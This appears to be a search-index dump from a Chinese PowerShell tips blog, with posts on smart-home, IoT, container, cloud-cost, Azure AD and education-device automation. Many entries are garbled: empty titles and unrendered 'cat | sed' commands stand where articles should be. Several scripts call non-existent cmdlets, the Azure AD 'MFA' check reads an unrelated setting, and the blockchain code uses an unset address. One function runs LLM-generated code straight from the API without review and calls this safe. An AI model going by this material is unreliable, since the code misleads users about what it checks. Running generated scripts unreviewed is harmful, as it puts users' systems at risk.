&quot;Humidity&quot; = 60 } &quot;Status&quot; = @{ &quot;ResponseTime&quot; = 1000 &quot;Uptime&quot; = 99.9 &quot;BatteryLevel&quot; = 20 } } ` -ReportPath &quot;C:\\Reports\\device_monitoring.json&quot; ` -AutoAlert# 管理智能家居场景$manager = Manage-SmartHomeScenes -SceneID &quot;SCENE001&quot; ` -SceneTypes @(&quot;Morning&quot;, &quot;Evening&quot;, &quot;Night&quot;) ` -ExecutionMode &quot;Scheduled&quot; ` -SceneConfig @{ &quot;Morning&quot; = @{ &quot;Time&quot; = &quot;06:00&quot; &quot;Actions&quot; = @{ &quot;Light&quot; = &quot;On&quot; &quot;Temperature&quot; = 22 &quot;Music&quot; = &quot;Play&quot; } &quot;Duration&quot; = 30 } &quot;Evening&quot; = @{ &quot;Time&quot; = &quot;18:00&quot; &quot;Actions&quot; = @{ &quot;Light&quot; = &quot;Dim&quot; &quot;Temperature&quot; = 24 &quot;Curtain&quot; = &quot;Close&quot; } &quot;Duration&quot; = 60 } &quot;Night&quot; = @{ &quot;Time&quot; = &quot;22:00&quot; &quot;Actions&quot; = @{ &quot;Light&quot; = &quot;Off&quot; &quot;Temperature&quot; = 20 &quot;Security&quot; = &quot;Armed&quot; } &quot;Duration&quot; = 480 } } ` -LogPath &quot;C:\\Logs\\scene_management.json&quot;# 管理智能家居能源$energy = Manage-SmartHomeEnergy -EnergyID &quot;ENERGY001&quot; ` -EnergyTypes @(&quot;Electricity&quot;, &quot;Water&quot;, &quot;Gas&quot;) ` -AnalysisMode &quot;Daily&quot; ` -EnergyConfig @{ &quot;Electricity&quot; = @{ &quot;PeakHours&quot; = @(&quot;08:00-12:00&quot;, &quot;18:00-22:00&quot;) &quot;Tariff&quot; = @{ &quot;Peak&quot; = 1.2 &quot;OffPeak&quot; = 0.8 } &quot;Optimization&quot; = $true } &quot;Water&quot; = @{ &quot;DailyLimit&quot; = 200 &quot;LeakDetection&quot; = $true &quot;Optimization&quot; = $true } &quot;Gas&quot; = @{ &quot;DailyLimit&quot; = 10 &quot;TemperatureControl&quot; = $true &quot;Optimization&quot; = $true } } ` -ReportPath &quot;C:\\Reports\\energy_management.json&quot; 最佳实践 监控设备状态 管理场景配置 优化能源使用 保持详细的运行记录 定期进行设备检查 实施能源节约策略 建立预警机制 保持系统文档更新","link":"/2024/12/18/powershell-smart-home/"},{"title":"PowerShell 技能连载 - 边缘计算环境中的IoT设备监控","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253function Get-IoTEdgeDeviceStatus { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$DeviceIPRange, [ValidateRange(1,65535)] [int]$PollingInterval = 300 ) $deviceReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' OnlineDevices = @() OfflineDevices = @() AbnormalMetrics = @() } # 执行Ping扫描发现设备 $discoveredDevices = Test-Connection -ComputerName $DeviceIPRange -Count 1 -AsJob | Wait-Job | Receive-Job | Where-Object { $_.StatusCode -eq 0 } | Select-Object Address,ResponseTime # 获取设备遥测数据 $discoveredDevices | ForEach-Object { try { $metrics = Invoke-RestMethod -Uri &quot;http://$($_.Address)/metrics&quot; -TimeoutSec 5 $deviceReport.OnlineDevices += [PSCustomObject]@{ IPAddress = $_.Address Latency = $_.ResponseTime CPUUsage = $metrics.cpu_usage MemoryUsage = $metrics.memory_usage } if($metrics.cpu_usage -gt 90 -or $metrics.memory_usage -gt 85) { $deviceReport.AbnormalMetrics += [PSCustomObject]@{ IPAddress = $_.Address Metric = ($metrics | ConvertTo-Json) Threshold = &quot;CPU &gt;90% 或 Memory &gt;85%&quot; } } } catch { $deviceReport.OfflineDevices += $_.Address } } # 生成HTML报告 $reportPath = &quot;$env:TEMP/IoTEdgeReport_$(Get-Date -Format yyyyMMdd).html&quot; $deviceReport | ConvertTo-Html -Title &quot;IoT设备健康报告&quot; | Out-File $reportPath return $deviceReport} 核心功能： 工业设备自动发现与状态采集 设备资源使用率实时监控 异常阈值自动预警 HTML格式可视化报告 应用场景： 智能制造设备监控 能源行业传感器网络 智慧城市基础设施 远程设备维护预警","link":"/2024/12/19/powershell-iot-edge-monitoring/"},{"title":"PowerShell 技能连载 - 智能运维中的自然语言脚本生成","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243function Invoke-AIOpsAssistant { param( [Parameter(Mandatory=$true)] [string]$Prompt, [int]$MaxTokens = 200 ) $apiKey = 'sk-xxxxxxxxxxxx' $headers = @{ 'Authorization' = &quot;Bearer $apiKey&quot; 'Content-Type' = 'application/json' } $body = @{ model = 'gpt-3.5-turbo' messages = @( @{ role = 'system' content = '你是一个PowerShell专家，根据用户需求生成可直接运行的脚本。要求：1) 使用原生命令 2) 添加详细注释 3) 包含错误处理' }, @{ role = 'user' content = $Prompt } ) max_tokens = $MaxTokens } | ConvertTo-Json -Depth 5 try { $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' \\ -Method Post \\ -Headers $headers \\ -Body $body $generatedCode = $response.choices[0].message.content $tempScript = [System.IO.Path]::GetTempFileName() + '.ps1' $generatedCode | Out-File -FilePath $tempScript &amp; $tempScript } catch { Write-Error &quot;AI脚本生成失败：$_&quot; }} 核心功能： 集成OpenAI ChatGPT API实现自然语言转PowerShell脚本 自动生成带错误处理和注释的生产级代码 安全执行临时脚本文件 支持自定义提示工程参数 应用场景： 快速生成AD用户批量管理脚本 自动创建资源监控报表 生成复杂日志分析管道命令","link":"/2024/12/20/powershell-ai-ops/"},{"title":"","text":"$(cat _posts/2024-12-23-powershell-dynamic-module.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/23/powershell-dynamic-module/"},{"title":"","text":"$(cat _posts/2024-12-25-powershell-event-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/25/powershell-event-management/"},{"title":"","text":"$(cat _posts/2024-12-26-powershell-finance-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/26/powershell-finance-integration/"},{"title":"PowerShell 技能连载 - 供应链安全漏洞扫描","text":"123456789101112131415161718192021222324252627282930313233function Invoke-SupplyChainScan { param( [Parameter(Mandatory=$true)] [string]$ImageName, [string]$OutputFormat = 'table', [string]$SeverityLevel = 'HIGH,CRITICAL' ) # 安装Trivy漏洞扫描器 if (-not (Get-Command trivy -ErrorAction SilentlyContinue)) { winget install aquasecurity.trivy } try { # 执行容器镜像扫描 $result = trivy image --format $OutputFormat --severity $SeverityLevel $ImageName # 生成HTML报告 $htmlReport = &quot;$env:TEMP\\scan_report_$(Get-Date -Format yyyyMMddHHmmss).html&quot; trivy image --format template --template &quot;@contrib/html.tpl&quot; -o $htmlReport $ImageName [PSCustomObject]@{ ScanTarget = $ImageName VulnerabilitiesFound = $result.Count CriticalCount = ($result | Where-Object { $_ -match 'CRITICAL' }).Count HighCount = ($result | Where-Object { $_ -match 'HIGH' }).Count HTMLReportPath = $htmlReport } } catch { Write-Error &quot;漏洞扫描失败：$_&quot; }} 核心功能： 集成Trivy进行容器镜像漏洞扫描 支持多种输出格式(table/json/html) 自动生成带严重等级分类的报告 包含依赖组件版本检查 应用场景： CI/CD流水线安全门禁 第三方组件入仓检查 生产环境镜像定期审计","link":"/2024/12/27/powershell-supply-chain-security/"},{"title":"","text":"$(cat _posts/2024-12-30-powershell-array-collections.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/12/30/powershell-array-collections/"},{"title":"","text":"$(cat _posts/2025-01-01-powershell-video-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/01/powershell-video-processing/"},{"title":"","text":"$(cat _posts/2025-01-06-powershell-green-computing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/06/powershell-green-computing/"},{"title":"","text":"$(cat _posts/2025-01-08-powershell-error-handling-techniques.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段代码展示了PowerShell中的错误处理技术。错误处理是任何健壮脚本的关键部分，可以确保脚本在遇到异常情况时能够优雅地响应，而不是简单地失败。通过使用try/catch/finally块和错误变量，PowerShell提供了全面的错误管理能力。\\n/}pd}p’)","link":"/2025/01/08/powershell-error-handling-techniques/"},{"title":"","text":"$(cat _posts/2025-01-07-powershell-file-system-operations.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/07/powershell-file-system-operations/"},{"title":"PowerShell 技能连载 - 区块链智能合约自动化管理","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253function Invoke-SmartContractOperation { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ContractABI, [ValidateSet('Deploy','Execute','Query')] [string]$OperationType = 'Query' ) $blockchainReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' TransactionHash = $null GasUsed = 0 ContractAddress = $null } try { # 初始化Web3实例 $web3 = New-Web3 -ProviderUrl 'https://mainnet.infura.io/v3/YOUR-API-KEY' # 智能合约操作 switch($OperationType) { 'Deploy' { $txReceipt = $web3.Eth.DeployContract.SendRequestAsync($ContractABI).GetAwaiter().GetResult() $blockchainReport.ContractAddress = $txReceipt.ContractAddress } 'Execute' { $contract = $web3.Eth.GetContract($ContractABI, $blockchainReport.ContractAddress) $function = $contract.GetFunction('executeOperation') $txHash = $function.SendTransactionAsync().GetAwaiter().GetResult() $blockchainReport.TransactionHash = $txHash } 'Query' { $contract = $web3.Eth.GetContract($ContractABI, $blockchainReport.ContractAddress) $result = $contract.GetFunction('getState').CallAsync().GetAwaiter().GetResult() return $result } } # 获取Gas消耗 $txReceipt = $web3.Eth.Transactions.GetTransactionReceipt.SendRequestAsync($blockchainReport.TransactionHash).GetAwaiter().GetResult() $blockchainReport.GasUsed = $txReceipt.GasUsed } catch { Write-Error &quot;智能合约操作失败: $_&quot; } # 生成区块链审计日志 $blockchainReport | ConvertTo-Json | Out-File -Path &quot;$env:TEMP/BlockchainReport_$(Get-Date -Format yyyyMMdd).json&quot; return $blockchainReport} 核心功能： 智能合约自动化部署 交易执行与状态查询 Gas消耗实时监控 JSON格式审计日志 应用场景： DeFi协议自动化管理 NFT数字资产发行 DAO治理流程自动化 跨链桥接操作监控","link":"/2025/01/10/powershell-blockchain-integration/"},{"title":"PowerShell 技能连载 - 容器化脚本自动化管理","text":"123456789101112131415161718192021222324252627282930313233343536373839function Invoke-ContainerPipeline { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ImageName, [string]$DockerfilePath = './Dockerfile' ) $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' BuildLog = @() DeploymentStatus = @() } # 构建Docker镜像 $buildOutput = docker build -t $ImageName -f $DockerfilePath . 2&gt;&amp;1 $report.BuildLog += $buildOutput # 推送镜像到仓库 if ($LASTEXITCODE -eq 0) { $pushOutput = docker push $ImageName 2&gt;&amp;1 $report.BuildLog += $pushOutput } # 部署到Kubernetes if ($LASTEXITCODE -eq 0) { $k8sOutput = kubectl apply -f deployment.yaml 2&gt;&amp;1 $report.DeploymentStatus += [PSCustomObject]@{ Cluster = (kubectl config current-context) Status = if($LASTEXITCODE -eq 0){'Success'}else{'Failed'} Output = $k8sOutput } } # 生成HTML报告 $htmlReport = $report | ConvertTo-Html -Fragment $htmlReport | Out-File &quot;$env:TEMP/ContainerReport_$(Get-Date -Format yyyyMMdd).html&quot; return $report} 核心功能： Docker镜像自动化构建 容器仓库自动推送 Kubernetes部署集成 HTML运维报告生成 典型应用场景： 持续集成/持续部署(CI/CD) 跨环境容器镜像管理 蓝绿部署策略实施 容器化应用生命周期管理","link":"/2025/01/10/powershell-container-automation/"},{"title":"PowerShell 技能连载 - 工业能源优化智能分析系统","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function Optimize-IndustrialEnergy { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$DeviceEndpoint, [ValidateSet('Realtime','Historical')] [string]$AnalysisMode = 'Realtime' ) $energyReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' PowerConsumption = @{} Predictions = @{} Anomalies = @() } try { # 实时能耗数据采集 $liveData = Invoke-RestMethod -Uri &quot;$DeviceEndpoint/api/live&quot; $energyReport.PowerConsumption = $liveData.Measurements | Group-Object DeviceID -AsHashTable # 历史数据分析模式 if ($AnalysisMode -eq 'Historical') { $historicalData = Invoke-RestMethod -Uri &quot;$DeviceEndpoint/api/history?days=30&quot; $energyReport.Predictions = $historicalData | ForEach-Object { [PSCustomObject]@{ DeviceID = $_.DeviceID PredictedUsage = [math]::Round($_.Baseline * (1 + (Get-Random -Minimum -0.1 -Maximum 0.1)),2) } } } # 异常检测引擎 $liveData.Measurements | ForEach-Object { if ($_.CurrentUsage -gt ($_.Baseline * 1.15)) { $energyReport.Anomalies += [PSCustomObject]@{ Device = $_.DeviceID Metric = 'PowerOverload' Actual = $_.CurrentUsage Threshold = [math]::Round($_.Baseline * 1.15,2) } } } } catch { Write-Error &quot;能源数据分析失败: $_&quot; } # 生成优化建议报告 $energyReport | Export-Clixml -Path &quot;$env:TEMP/EnergyReport_$(Get-Date -Format yyyyMMdd).xml&quot; return $energyReport} 核心功能： 工业能耗实时/历史数据分析 智能基线预测模型 异常超限检测引擎 XML格式优化报告生成 应用场景： 工业控制系统能耗优化 智能电网负载预测 生产设备预防性维护 碳足迹分析与管理","link":"/2025/01/10/powershell-energy-optimization/"},{"title":"多云环境成本优化自动化实践","text":"123456789101112131415161718192021222324252627282930function Get-CloudCostAnalysis { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [ValidateSet('Azure','AWS')] [string]$CloudProvider ) $threshold = 100 # 美元 switch ($CloudProvider) { 'Azure' { $costData = Get-AzConsumptionUsageDetail -BillingPeriodName (Get-Date).ToString('yyyyMM') | Group-Object ResourceGroup | Select-Object Name,@{N='Cost';E={$_.Group.PretaxCost | Measure-Object -Sum | Select-Object -Expand Sum}} } 'AWS' { $costData = Get-CECostAndUsage -TimePeriod @{Start=(Get-Date).AddDays(-30).ToString('yyyy-MM-dd');End=(Get-Date).ToString('yyyy-MM-dd')} -Granularity MONTHLY | Select-Object -Expand ResultsByTime | Select-Object -Expand Groups | Where-Object {$_.Metrics.UnblendedCost.Amount -gt $threshold} } } $costData | Export-Csv -Path &quot;${CloudProvider}_Cost_Report_$(Get-Date -Format yyyyMMdd).csv&quot; -NoTypeInformation if ($costData.Count -gt 5) { Send-MailMessage -To 'finops@company.com' -Subject &quot;[$CloudProvider] 成本异常警报&quot; -Body &quot;发现${threshold}美元以上资源：$($costData.Count)项&quot; }} 核心功能： 支持Azure/AWS多云平台成本分析 自动识别异常支出资源 生成CSV报告并邮件告警 可配置成本阈值参数 扩展方向： 集成Power BI可视化 添加自动关闭闲置资源功能 实现跨云平台成本对比分析","link":"/2025/01/14/cloud-cost-optimization/"},{"title":"","text":"$(cat _posts/2025-01-13-powershell-regex-tips.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/13/powershell-regex-tips/"},{"title":"","text":"$(cat _posts/2025-01-15-powershell-ai-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/15/powershell-ai-integration/"},{"title":"","text":"$(cat _posts/2025-01-15-powershell-configuration-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/15/powershell-configuration-management/"},{"title":"","text":"$(cat _posts/2025-01-15-powershell-docker-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了如何使用PowerShell管理Docker容器和镜像。Docker是一个开源的容器化平台，而PowerShell提供了与Docker API交互的能力，允许自动化容器部署、管理和监控。这种集成使DevOps专业人员能够将Docker操作纳入更广泛的自动化工作流程。\\n/}pd}p’)","link":"/2025/01/15/powershell-docker-management/"},{"title":"PowerShell 技能连载 - Azure AD安全审计自动化","text":"在云身份管理日益重要的今天，定期安全审计成为保障企业数字资产的关键。本文演示如何通过PowerShell自动执行Azure AD安全配置检测，实现实时安全态势监控。 123456789101112131415161718192021222324252627282930313233343536function Invoke-AzureADSecurityAudit { param( [string]$TenantId, [switch]$ExportReport ) try { # 连接Azure AD Connect-AzureAD -TenantId $TenantId | Out-Null # 安全基线检测 $results = @( [PSCustomObject]@{ CheckItem = '多重认证状态' Result = (Get-AzureADMSAuthorizationPolicy).DefaultUserRolePermissions.AllowedToCreateApps }, [PSCustomObject]@{ CheckItem = '旧协议支持状态' Result = (Get-AzureADDirectorySetting | Where-Object {$_.DisplayName -eq 'OrganizationProperties'}).Values } ) # 生成报告 if ($ExportReport) { $results | Export-Csv -Path &quot;./SecurityAudit_$(Get-Date -Format yyyyMMdd).csv&quot; -NoTypeInformation } return $results } catch { Write-Error &quot;审计失败：$_&quot; } finally { Disconnect-AzureAD }} 实现原理分析： 通过AzureAD模块实现与云身份服务的认证连接 检测关键安全配置项包括MFA实施状态和旧版协议支持情况 支持CSV报告导出功能便于存档分析 自动清理会话确保操作安全性 结构化返回结果便于后续处理 该脚本将原本需要人工操作的审计流程自动化，特别适合需要持续合规监控的金融和医疗行业应用场景。","link":"/2025/01/16/powershell-azuread-security-audit/"},{"title":"","text":"$(cat _posts/2025-01-15-powershell-performance-monitoring.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/15/powershell-performance-monitoring/"},{"title":"PowerShell 技能连载 - 教育设备同步管理","text":"在教育设备管理领域，设备同步对于确保教学资源的统一性和可访问性至关重要。本文将介绍如何使用PowerShell构建一个教育设备同步管理系统，包括设备配置、内容同步、状态监控等功能。 设备配置首先，让我们创建一个用于管理教育设备配置的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115function Manage-EducationConfig { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SchoolID, [Parameter()] [string[]]$DeviceTypes, [Parameter()] [string[]]$ConfigTypes, [Parameter()] [hashtable]$ConfigSettings, [Parameter()] [string]$ReportPath, [Parameter()] [switch]$AutoApply ) try { $manager = [PSCustomObject]@{ SchoolID = $SchoolID StartTime = Get-Date Configurations = @{} Status = @{} Changes = @() } # 获取学校信息 $school = Get-SchoolInfo -SchoolID $SchoolID # 管理配置 foreach ($type in $DeviceTypes) { $manager.Configurations[$type] = @{} $manager.Status[$type] = @{} foreach ($device in $school.Devices[$type]) { $config = [PSCustomObject]@{ DeviceID = $device.ID Status = &quot;Unknown&quot; Settings = @{} Compliance = 0 Changes = @() } # 获取设备配置 $deviceConfig = Get-DeviceConfig ` -Device $device ` -Types $ConfigTypes $config.Settings = $deviceConfig # 检查配置合规性 $compliance = Check-ConfigCompliance ` -Config $deviceConfig ` -Settings $ConfigSettings $config.Compliance = $compliance # 生成配置更改 $changes = Generate-ConfigChanges ` -Config $deviceConfig ` -Settings $ConfigSettings if ($changes.Count -gt 0) { $config.Status = &quot;NeedsUpdate&quot; $config.Changes = $changes $manager.Changes += $changes # 自动应用配置 if ($AutoApply) { $applyResult = Apply-DeviceConfig ` -Device $device ` -Changes $changes if ($applyResult.Success) { $config.Status = &quot;Updated&quot; } } } else { $config.Status = &quot;Compliant&quot; } $manager.Configurations[$type][$device.ID] = $config $manager.Status[$type][$device.ID] = [PSCustomObject]@{ Status = $config.Status Compliance = $config.Compliance Changes = $config.Changes } } } # 生成报告 if ($ReportPath) { $report = Generate-ConfigReport ` -Manager $manager ` -School $school $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;设备配置管理失败：$_&quot; return $null }} 内容同步接下来，创建一个用于管理教育内容同步的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Manage-EducationSync { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SyncID, [Parameter()] [string[]]$ContentTypes, [Parameter()] [ValidateSet(&quot;RealTime&quot;, &quot;Scheduled&quot;, &quot;Manual&quot;)] [string]$SyncMode = &quot;Scheduled&quot;, [Parameter()] [hashtable]$SyncConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ SyncID = $SyncID StartTime = Get-Date SyncStatus = @{} Content = @{} Errors = @() } # 获取同步配置 $config = Get-SyncConfig -SyncID $SyncID # 管理同步 foreach ($type in $ContentTypes) { $sync = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Content = @() Statistics = @{} } # 应用同步配置 $typeConfig = Apply-SyncConfig ` -Config $config ` -Type $type ` -Mode $SyncMode ` -Settings $SyncConfig $sync.Config = $typeConfig # 同步内容 $content = Sync-EducationContent ` -Type $type ` -Config $typeConfig $sync.Content = $content $manager.Content[$type] = $content # 计算同步统计 $statistics = Calculate-SyncStatistics ` -Content $content ` -Type $type $sync.Statistics = $statistics # 验证同步结果 $errors = Validate-SyncResults ` -Content $content ` -Config $typeConfig if ($errors.Count -gt 0) { $sync.Status = &quot;Error&quot; $manager.Errors += $errors } else { $sync.Status = &quot;Success&quot; } $manager.SyncStatus[$type] = $sync } # 记录同步日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;内容同步管理失败：$_&quot; return $null }} 状态监控最后，创建一个用于监控教育设备状态的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192function Monitor-EducationStatus { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MonitorID, [Parameter()] [string[]]$MonitorTypes, [Parameter()] [ValidateSet(&quot;Active&quot;, &quot;Inactive&quot;, &quot;Maintenance&quot;)] [string]$Status = &quot;Active&quot;, [Parameter()] [hashtable]$MonitorRules, [Parameter()] [string]$ReportPath ) try { $monitor = [PSCustomObject]@{ MonitorID = $MonitorID StartTime = Get-Date MonitorStatus = @{} Metrics = @{} Alerts = @() } # 获取监控配置 $config = Get-MonitorConfig -MonitorID $MonitorID # 监控状态 foreach ($type in $MonitorTypes) { $status = [PSCustomObject]@{ Type = $type Status = $Status Rules = @{} Metrics = @{} Alerts = @() } # 应用监控规则 $rules = Apply-MonitorRules ` -Config $config ` -Type $type ` -Status $Status ` -Rules $MonitorRules $status.Rules = $rules # 收集监控指标 $metrics = Collect-MonitorMetrics ` -Type $type ` -Rules $rules $status.Metrics = $metrics $monitor.Metrics[$type] = $metrics # 检查告警条件 $alerts = Check-MonitorAlerts ` -Metrics $metrics ` -Rules $rules if ($alerts.Count -gt 0) { $status.Status = &quot;Alert&quot; $status.Alerts = $alerts $monitor.Alerts += $alerts } $monitor.MonitorStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MonitorReport ` -Monitor $monitor ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;状态监控失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理教育设备同步的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 管理设备配置$manager = Manage-EducationConfig -SchoolID &quot;SCH001&quot; ` -DeviceTypes @(&quot;Desktop&quot;, &quot;Laptop&quot;, &quot;Tablet&quot;) ` -ConfigTypes @(&quot;System&quot;, &quot;Application&quot;, &quot;Security&quot;) ` -ConfigSettings @{ &quot;System&quot; = @{ &quot;OSVersion&quot; = &quot;Windows 11&quot; &quot;Updates&quot; = &quot;Automatic&quot; &quot;Backup&quot; = &quot;Enabled&quot; } &quot;Application&quot; = @{ &quot;Office&quot; = &quot;Latest&quot; &quot;Browser&quot; = &quot;Chrome&quot; &quot;Antivirus&quot; = &quot;Enabled&quot; } &quot;Security&quot; = @{ &quot;Firewall&quot; = &quot;Enabled&quot; &quot;Encryption&quot; = &quot;Enabled&quot; &quot;Access&quot; = &quot;Restricted&quot; } } ` -ReportPath &quot;C:\\Reports\\config_management.json&quot; ` -AutoApply# 管理内容同步$syncManager = Manage-EducationSync -SyncID &quot;SYNC001&quot; ` -ContentTypes @(&quot;Courseware&quot;, &quot;Resources&quot;, &quot;Assignments&quot;) ` -SyncMode &quot;Scheduled&quot; ` -SyncConfig @{ &quot;Courseware&quot; = @{ &quot;Interval&quot; = 24 &quot;Priority&quot; = &quot;High&quot; &quot;Retention&quot; = 30 } &quot;Resources&quot; = @{ &quot;Interval&quot; = 12 &quot;Priority&quot; = &quot;Medium&quot; &quot;Retention&quot; = 90 } &quot;Assignments&quot; = @{ &quot;Interval&quot; = 6 &quot;Priority&quot; = &quot;High&quot; &quot;Retention&quot; = 365 } } ` -LogPath &quot;C:\\Logs\\sync_management.json&quot;# 监控设备状态$monitor = Monitor-EducationStatus -MonitorID &quot;MON001&quot; ` -MonitorTypes @(&quot;System&quot;, &quot;Network&quot;, &quot;Storage&quot;) ` -Status &quot;Active&quot; ` -MonitorRules @{ &quot;System&quot; = @{ &quot;CPUUsage&quot; = 80 &quot;MemoryUsage&quot; = 85 &quot;DiskSpace&quot; = 90 } &quot;Network&quot; = @{ &quot;Bandwidth&quot; = 80 &quot;Latency&quot; = 100 &quot;PacketLoss&quot; = 1 } &quot;Storage&quot; = @{ &quot;Usage&quot; = 85 &quot;IOPS&quot; = 1000 &quot;Latency&quot; = 50 } } ` -ReportPath &quot;C:\\Reports\\status_monitoring.json&quot; 最佳实践 管理设备配置 同步教育内容 监控设备状态 保持详细的运行记录 定期进行性能评估 实施同步策略 建立预警机制 保持系统文档更新","link":"/2025/01/17/powershell-education-sync/"},{"title":"","text":"$(cat _posts/2025-01-20-powershell-regex-essentials.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/01/20/powershell-regex-essentials/"},{"title":"PowerShell 技能连载 - 跨平台脚本编写技巧","text":"随着PowerShell Core的发展，PowerShell已经成为真正的跨平台自动化工具。本文将介绍如何编写在Windows、Linux和macOS上都能正常运行的PowerShell脚本。 检测操作系统平台首先，让我们学习如何检测脚本运行的操作系统平台： 1234567891011121314151617function Get-CurrentPlatform { if ($IsWindows -or ($PSVersionTable.PSVersion.Major -lt 6 -and $env:OS -eq &quot;Windows_NT&quot;)) { return &quot;Windows&quot; } elseif ($IsLinux) { return &quot;Linux&quot; } elseif ($IsMacOS) { return &quot;macOS&quot; } else { return &quot;Unknown&quot; 